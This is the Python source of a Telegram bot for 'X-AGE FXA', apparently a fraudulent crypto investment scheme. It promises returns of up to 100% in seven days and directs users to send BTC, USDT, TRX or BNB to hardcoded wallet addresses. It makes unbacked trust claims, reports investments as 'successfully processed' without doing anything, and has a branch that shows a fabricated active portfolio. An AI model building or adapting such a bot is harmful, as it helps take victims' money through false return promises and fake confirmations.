
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import os
import ccxt
from datetime import datetime
import pytz

print("Script is starting...")

# Get token from environment variable
BOT_TOKEN = os.environ['BOT_TOKEN']

# Minimum investment
MIN_INVESTMENT = 32.7

# Start command with main menu
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💰 Invest Now", callback_data="invest")],
        [InlineKeyboardButton("📊 Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton("📈 Market Trends", callback_data="market")],
        [InlineKeyboardButton("ℹ️ About Us", callback_data="about")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_message = (
        "✨ *Welcome to X-AGE FXA* ✨\n\n"
        "🚀 _AI-powered Crypto Investment Engine_\n"
        "🔐 Secure | 📈 Smart Profits | ⚡️ Fast Payouts\n\n"
        "*Choose an option below to continue:*"
    )

    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode="Markdown")

# Handle all menu buttons
async def handle_menu_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "invest":
        keyboard = [
            [InlineKeyboardButton("🔹 Starter Plan - 32.7 USDT", callback_data="plan_starter")],
            [InlineKeyboardButton("🔸 Pro Plan - 100 USDT", callback_data="plan_pro")],
            [InlineKeyboardButton("🔶 Elite Plan - 500 USDT", callback_data="plan_elite")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]
        ]
        text = (
            "💰 *Select Your Investment Plan*\n\n"
            "Choose the plan that best suits your investment goals:\n\n"
            "🔹 *Starter Plan*\n"
            "⏱ 24h | 💵 Return: 10%\n\n"
            "🔸 *Pro Plan*\n"
            "⏱ 3 Days | 💵 Return: 40%\n\n"
            "🔶 *Elite Plan*\n"
            "⏱ 7 Days | 💵 Return: 100%"
        )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data.startswith("plan_"):
        plan = query.data.split("_")[1]
        plans = {
            "starter": {"amount": 32.7, "duration": "24 hours", "return": "10%"},
            "pro": {"amount": 100, "duration": "3 days", "return": "40%"},
            "elite": {"amount": 500, "duration": "7 days", "return": "100%"}
        }
        selected = plans[plan]
        
        keyboard = [
            [InlineKeyboardButton("₿ Bitcoin (BTC)", callback_data=f"pay_btc_{plan}")],
            [InlineKeyboardButton("💎 USDT", callback_data=f"pay_usdt_{plan}")],
            [InlineKeyboardButton("⚡ TRX (Tron)", callback_data=f"pay_trx_{plan}")],
            [InlineKeyboardButton("🌟 BNB", callback_data=f"pay_bnb_{plan}")],
            [InlineKeyboardButton("🔙 Back to Plans", callback_data="invest")]
        ]
        
        text = (
            f"🎉 *Confirm Your Investment*\n\n"
            f"Selected Plan: *{plan.title()}*\n"
            f"Investment Amount: *{selected['amount']} USDT*\n"
            f"Duration: *{selected['duration']}*\n"
            f"Expected Return: *{selected['return']}*\n\n"
            f"Please select your preferred payment method:"
        )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data.startswith("pay_"):
        _, method, plan = query.data.split("_")
        keyboard = [[InlineKeyboardButton("🔙 Back to Payment Options", callback_data=f"plan_{plan}")]]
        
        payment_info = {
            "btc": "₿ *Bitcoin Payment*\n\nSend BTC to:\n`bc1ql0rchm2q2rmyjs6f72rlu6dfmmpm02f2733ht4`",
            "usdt": "💎 *USDT Payment (TRC20)*\n\nSend USDT to:\n`TCEAEShq4Q59LsRo32RPJMx4PLevCi1cM1`",
            "trx": "⚡ *TRX Payment*\n\nSend TRX to:\n`TCEAEShq4Q59LsRo32RPJMx4PLevCi1cM1`",
            "bnb": "🌟 *BNB Payment (BEP20)*\n\nSend BNB to:\n`0xA9A3a0F59939e329aF165953Db4a3D70Af098E52`"
        }
        
        keyboard = [
            [InlineKeyboardButton("📸 Send Payment Proof", callback_data=f"proof_{method}_{plan}")],
            [InlineKeyboardButton("🔙 Back to Payment Options", callback_data=f"plan_{plan}")]
        ]
        
        text = payment_info.get(method, "❌ Invalid payment method selected.")
        text += "\n\n*After payment, click below to send payment proof:*"
            
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data.startswith("proof_"):
        _, method, plan = query.data.split("_")
        # Store payment details in context
        context.user_data['pending_payment'] = {
            'method': method,
            'plan': plan,
            'timestamp': datetime.now().strftime("%B %d, %Y")
        }
        
        text = (
            "📸 *Send Payment Screenshot*\n\n"
            "1. Take a clear screenshot of your payment\n"
            "2. Send it as a reply to this message\n"
            "3. Contact support for verification\n"
            "4. Once verified, your portfolio will be updated\n\n"
            "*Note: Your investment will be active after verification*"
        )
        keyboard = [
            [InlineKeyboardButton("💬 Contact Support", url="https://t.me/xagefxa_support")],
            [InlineKeyboardButton("🔙 Back to Plans", callback_data="invest")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "portfolio":
        # Check if user has active investments (you'll need to implement a proper database)
        has_active_investment = False  # This should be checked from your database
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        if not has_active_investment:
            text = (
                "📊 *Your Portfolio*\n\n"
                "You don't have any active investments.\n\n"
                "Click 'Invest Now' to start earning!"
            )
            keyboard.insert(0, [InlineKeyboardButton("💰 Invest Now", callback_data="invest")])
        else:
            text = (
                "📊 *Your Portfolio*\n\n"
                "✅ Active Plan: *Pro*\n"
                "💵 Return in 2 days: *40%*\n"
                "📅 Invested on: *April 6, 2025*\n"
            )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "market":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        text = "📈 *Market Trends*\n\nMarket data is currently being updated."
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data.startswith("confirm_"):
        _, method, plan = query.data.split("_")
        plans = {
            "starter": {"amount": 32.7, "duration": "24 hours", "return": "10%"},
            "pro": {"amount": 100, "duration": "3 days", "return": "40%"},
            "elite": {"amount": 500, "duration": "7 days", "return": "100%"}
        }
        selected = plans[plan]
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        text = (
            "✅ *Payment Confirmation Received!*\n\n"
            "📊 *Your Active Investment*\n\n"
            f"Plan: *{plan.title()}*\n"
            f"Amount: *{selected['amount']} USDT*\n"
            f"Duration: *{selected['duration']}*\n"
            f"Expected Return: *{selected['return']}*\n"
            f"Status: *Pending Verification*\n\n"
            "Our team will verify your payment shortly."
        )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "portfolio":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        text = (
            "📊 *Your Portfolio*\n\n"
            "✅ Active Plan: *Pro*\n"
            "💵 Return in 2 days: *40%*\n"
            "📅 Invested on: *April 6, 2025*\n"
        )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "market":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        await query.edit_message_text("📈 *Market Trends coming soon...*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "about":
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_home")]]
        text = (
            "ℹ️ *About X-AGE FXA*\n\n"
            "We are a secure crypto investment platform using AI to grow your assets.\n"
            "Trusted by over 5,000 users.\n\n"
            "📧 Contact: support@xagefxa.com"
        )
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif query.data == "back_home":
        keyboard = [
            [InlineKeyboardButton("💰 Invest Now", callback_data="invest")],
            [InlineKeyboardButton("📊 Portfolio", callback_data="portfolio")],
            [InlineKeyboardButton("📈 Market Trends", callback_data="market")],
            [InlineKeyboardButton("ℹ️ About Us", callback_data="about")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        welcome_message = (
            "✨ *Welcome to X-AGE FXA* ✨\n\n"
            "🚀 _AI-powered Crypto Investment Engine_\n"
            "🔐 Secure | 📈 Smart Profits | ⚡️ Fast Payouts\n\n"
            "*Choose an option below to continue:*"
        )
        await query.edit_message_text(welcome_message, reply_markup=reply_markup, parse_mode="Markdown")

# Command to start investment process
async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = "32.7"  # Assume user inputs a value
    try:
        amount = float(user_input)
        if amount < MIN_INVESTMENT:
            await update.message.reply_text(f"❌ Minimum investment is {MIN_INVESTMENT} USDT. Please enter a valid amount.")
        else:
            await update.message.reply_text(f"✅ Your investment of {amount} USDT has been successfully processed!")
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please enter a valid amount of USDT.")

async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.lower() == "approved":
        # Check if user is admin (you should implement proper admin check)
        if update.message.from_user.username == "xagefxa_support":
            # Get user's pending payment details
            if 'pending_payment' in context.user_data:
                payment = context.user_data['pending_payment']
                plans = {
                    "starter": {"amount": 32.7, "duration": "24 hours", "return": "10%"},
                    "pro": {"amount": 100, "duration": "3 days", "return": "40%"},
                    "elite": {"amount": 500, "duration": "7 days", "return": "100%"}
                }
                plan = payment['plan']
                selected = plans[plan]
                
                keyboard = [[InlineKeyboardButton("📊 View Portfolio", callback_data="portfolio")]]
                text = (
                    "✅ *Investment Approved!*\n\n"
                    "Your investment has been verified and activated.\n"
                    f"Plan: *{plan.title()}*\n"
                    f"Amount: *{selected['amount']} USDT*\n"
                    f"Start Date: *{payment['timestamp']}*\n"
                    f"Duration: *{selected['duration']}*\n"
                    f"Expected Return: *{selected['return']}*"
                )
                await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_menu_callbacks))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(MessageHandler(filters.TEXT, handle_messages))
    print("✅ Bot is running... (Check your Telegram)")
    app.run_polling()
